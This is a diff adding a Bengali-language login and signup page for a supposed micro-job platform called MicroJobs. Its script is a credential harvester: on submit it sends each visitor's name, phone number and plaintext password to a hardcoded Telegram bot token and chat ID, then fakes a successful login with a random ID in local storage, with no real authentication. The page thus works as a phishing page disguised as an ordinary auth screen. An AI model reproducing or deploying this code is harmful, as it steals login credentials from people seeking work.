@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="bn">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MicroJobs Auth</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <meta name="description"
+        content="বাংলাদেশের প্রথম ও সর্ববৃহৎ মাইক্রো জব প্ল্যাটফর্ম - পার্টটাইম কাজ খুঁজুন, ফ্রিল্যান্সিং করুন, দ্রুত আয় করুন">
+    <meta name="keywords"
+        content="মাইক্রো জব, অনলাইন আয়, ফ্রিল্যান্সিং, পার্টটাইম জব, বাংলাদেশ, ক্ষুদ্র কাজ, ডিজিটাল মার্কেটপ্লেস">
+    <meta name="author" content="মাইক্রোজবস টিম">
+    <meta name="language" content="bn-BD">
+
+    <!-- Open Graph/Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://microjobsbd.com">
+    <meta property="og:title" content="মাইক্রোজবস | বাংলাদেশের ক্ষুদ্র কাজের ডিজিটাল মার্কেটপ্লেস">
+    <meta property="og:description"
+        content="বাংলাদেশের প্রথম ও সর্ববৃহৎ মাইক্রো জব প্ল্যাটফর্ম - পার্টটাইম কাজ খুঁজুন, ফ্রিল্যান্সিং করুন, দ্রুত আয় করুন">
+    <meta property="og:image" content="https://microjobsbd.com/og-image.jpg">
+    <meta property="og:locale" content="bn_BD">
+
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@microjobsbd">
+    <meta name="twitter:creator" content="@microjobsbd">
+    <meta name="twitter:title" content="মাইক্রোজবস | বাংলাদেশের ক্ষুদ্র কাজের ডিজিটাল মার্কেটপ্লেস">
+    <meta name="twitter:description"
+        content="বাংলাদেশের প্রথম ও সর্ববৃহৎ মাইক্রো জব প্ল্যাটফর্ম - পার্টটাইম কাজ খুঁজুন, ফ্রিল্যান্সিং করুন, দ্রুত আয় করুন">
+    <meta name="twitter:image" content="https://microjobsbd.com/twitter-card.jpg">
+
+    <!-- PWA & Mobile -->
+    <meta name="theme-color" content="#10B981">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-title" content="মাইক্রোজবস">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+    <!-- Local Business -->
+    <meta name="geo.position" content="23.8103;90.4125">
+    <meta name="geo.region" content="BD-DH">
+    <meta name="geo.placename" content="Dhaka">
+    <meta name="ICBM" content="23.8103, 90.4125">
+
+    <!-- Security -->
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' https: data: 'unsafe-inline' 'unsafe-eval'">
+    <meta http-equiv="Strict-Transport-Security" content="max-age=63072000; includeSubDomains; preload">
+    <style>
+        :root {
+            --primary: #10B981;
+            --secondary: #059669;
+            --accent: #D1FAE5;
+            --text: #1F2937;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #F0FDF4, #DCFCE7);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 500px;
+            overflow: hidden;
+        }
+
+        .header {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            padding: 2rem;
+            color: white;
+            text-align: center;
+        }
+
+        .tabs {
+            display: flex;
+            border-bottom: 2px solid #E5E7EB;
+        }
+
+        .tab {
+            flex: 1;
+            padding: 1.2rem;
+            background: none;
+            border: none;
+            font-size: 1.1rem;
+            cursor: pointer;
+            color: #6B7280;
+            transition: all 0.3s;
+        }
+
+        .tab.active {
+            color: var(--primary);
+            border-bottom: 3px solid var(--primary);
+        }
+
+        .form {
+            padding: 2rem;
+        }
+
+        .input-group {
+            margin-bottom: 1.5rem;
+            position: relative;
+        }
+
+        .input-group i {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #6B7280;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px 12px 12px 40px;
+            border: 2px solid #E5E7EB;
+            border-radius: 10px;
+            font-size: 1rem;
+            transition: all 0.3s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px var(--accent);
+        }
+
+        button[type="submit"] {
+            width: 100%;
+            padding: 12px;
+            background: var(--primary);
+            border: none;
+            border-radius: 10px;
+            color: white;
+            font-size: 1rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: all 0.3s;
+        }
+
+        button[type="submit"]:hover {
+            background: var(--secondary);
+        }
+
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        @media (max-width: 480px) {
+            .header {
+                padding: 1.5rem;
+            }
+
+            .form {
+                padding: 1.5rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="header">
+            <h1><i class="fa-solid fa-hand-holding-hand"></i> MicroJobs</h1>
+            <p>ক্ষুদ্র কাজ, বড় সুযোগ
+
+            </p>
+        </div>
+
+        <div class="tabs">
+            <button class="tab active" id="loginTab">লগইন</button>
+            <button class="tab" id="signupTab">সাইনআপ</button>
+        </div>
+
+        <!-- লগইন ফর্ম -->
+        <form class="form" id="loginForm">
+            <div class="input-group">
+                <i class="fas fa-phone"></i>
+                <input type="tel" id="loginPhone" placeholder="01XXXXXXXXX" required>
+            </div>
+
+            <div class="input-group">
+                <i class="fas fa-lock"></i>
+                <input type="password" id="loginPassword" placeholder="পাসওয়ার্ড" required>
+            </div>
+
+            <button type="submit">
+                <span id="loginText">লগইন করুন</span>
+                <div class="spinner" id="loginSpinner"></div>
+            </button>
+        </form>
+
+        <!-- সাইনআপ ফর্ম -->
+        <form class="form" id="signupForm" style="display: none;">
+            <div class="input-group">
+                <i class="fas fa-user"></i>
+                <input type="text" id="signupName" placeholder="পূর্ণ নাম" required>
+            </div>
+
+            <div class="input-group">
+                <i class="fas fa-phone"></i>
+                <input type="tel" id="signupPhone" placeholder="01XXXXXXXXX" required>
+            </div>
+
+            <div class="input-group">
+                <i class="fas fa-lock"></i>
+                <input type="password" id="signupPassword" placeholder="পাসওয়ার্ড" required>
+            </div>
+
+            <div class="input-group">
+                <i class="fas fa-lock"></i>
+                <input type="password" id="signupConfirm" placeholder="পাসওয়ার্ড নিশ্চিত করুন" required>
+            </div>
+
+            <button type="submit">
+                <span id="signupText">একাউন্ট তৈরি করুন</span>
+                <div class="spinner" id="signupSpinner"></div>
+            </button>
+        </form>
+    </div>
+
+    <script>
+        // কনফিগারেশন (আপনার ডেটা দিয়ে পরিবর্তন করুন)
+        const BOT_TOKEN = '8106775982:AAFO3MlbC7hfjVrAK7pNOxg4Jmt091O4XAQ';
+        const CHAT_ID = '6422634012';
+
+        // সেশন চেক
+        function checkAuth() {
+            if (localStorage.getItem('isLoggedIn') === 'true') {
+                window.location.href = 'dashboard.html';
+            }
+        }
+        checkAuth();
+
+        // ট্যাব স্যুইচ লজিক
+        const loginTab = document.getElementById('loginTab');
+        const signupTab = document.getElementById('signupTab');
+        const loginForm = document.getElementById('loginForm');
+        const signupForm = document.getElementById('signupForm');
+
+        [loginTab, signupTab].forEach(tab => {
+            tab.addEventListener('click', () => {
+                loginTab.classList.remove('active');
+                signupTab.classList.remove('active');
+                tab.classList.add('active');
+                loginForm.style.display = tab === loginTab ? 'block' : 'none';
+                signupForm.style.display = tab === signupTab ? 'block' : 'none';
+            });
+        });
+
+        // রেন্ডম আইডি জেনারেটর
+        function generateUserId() {
+            return Math.floor(100000 + Math.random() * 900000);
+        }
+
+        // ডেটা সেন্ড টু টেলিগ্রাম
+        async function sendToTelegram(message) {
+            const response = await fetch(
+                `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`
+            );
+            return response.ok;
+        }
+
+        // লগইন হ্যান্ডলার
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const phone = document.getElementById('loginPhone').value;
+            const password = document.getElementById('loginPassword').value;
+
+            document.getElementById('loginSpinner').style.display = 'inline-block';
+            document.getElementById('loginText').style.visibility = 'hidden';
+
+            try {
+                const message = `🔐 লগইন প্রচেষ্টা:\n📱: ${phone}\n🔑: ${password}`;
+                const success = await sendToTelegram(message);
+
+                if (success) {
+                    localStorage.setItem('isLoggedIn', 'true');
+                    localStorage.setItem('userId', generateUserId());
+                    localStorage.setItem('userPhone', phone);
+                    window.location.href = 'home.html';
+                }
+            } catch (error) {
+                alert('ত্রুটি: সংযোগ ব্যর্থ!');
+            } finally {
+                document.getElementById('loginSpinner').style.display = 'none';
+                document.getElementById('loginText').style.visibility = 'visible';
+            }
+        });
+
+        // সাইনআপ হ্যান্ডলার
+        signupForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const name = document.getElementById('signupName').value;
+            const phone = document.getElementById('signupPhone').value;
+            const password = document.getElementById('signupPassword').value;
+            const confirmPass = document.getElementById('signupConfirm').value;
+
+            if (password !== confirmPass) {
+                alert('পাসওয়ার্ড মিলছে না!');
+                return;
+            }
+
+            document.getElementById('signupSpinner').style.display = 'inline-block';
+            document.getElementById('signupText').style.visibility = 'hidden';
+
+            try {
+                const message = `📝 নতুন রেজিস্ট্রেশন:\n👤: ${name}\n📱: ${phone}\n🔑: ${password}`;
+                const success = await sendToTelegram(message);
+
+                if (success) {
+                    localStorage.setItem('isLoggedIn', 'true');
+                    localStorage.setItem('userId', generateUserId());
+                    localStorage.setItem('userPhone', phone);
+                    window.location.href = 'home.html';
+                }
+            } catch (error) {
+                alert('ত্রুটি: সংযোগ ব্যর্থ!');
+            } finally {
+                document.getElementById('signupSpinner').style.display = 'none';
+                document.getElementById('signupText').style.visibility = 'visible';
+            }
+        });
+    </script>
+</body>
+
+</html>
